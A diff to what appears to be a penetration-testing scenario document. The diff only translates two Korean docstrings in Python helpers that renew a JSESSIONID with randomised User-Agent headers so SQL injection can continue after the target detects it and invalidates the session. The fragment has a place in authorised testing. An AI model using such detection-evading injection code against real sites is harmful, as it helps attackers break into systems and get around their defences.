@@ -445,7 +445,7 @@ SCENARIO C2 — Session invalidation after SQLi detection (status=-1 / 0B patter
   BASE_URL = "https://target.com/"
 
   def get_fresh_session():
-      """새 JSESSIONID 발급받기 — 매 주요 테스트 전에 호출"""
+      # Get fresh JSESSIONID before each major test
       req = urllib.request.Request(BASE_URL, headers={
           "User-Agent": random.choice(UA_LIST),
           "Accept": "text/html,*/*",
@@ -457,7 +457,7 @@ SCENARIO C2 — Session invalidation after SQLi detection (status=-1 / 0B patter
       return m.group(1) if m else None
 
   def safe_inject(url, payload, session_id=None):
-      """세션 자동 갱신 포함 인젝션"""
+      # Injection with automatic session renewal
       if session_id is None:
           session_id = get_fresh_session()
           time.sleep(0.5)
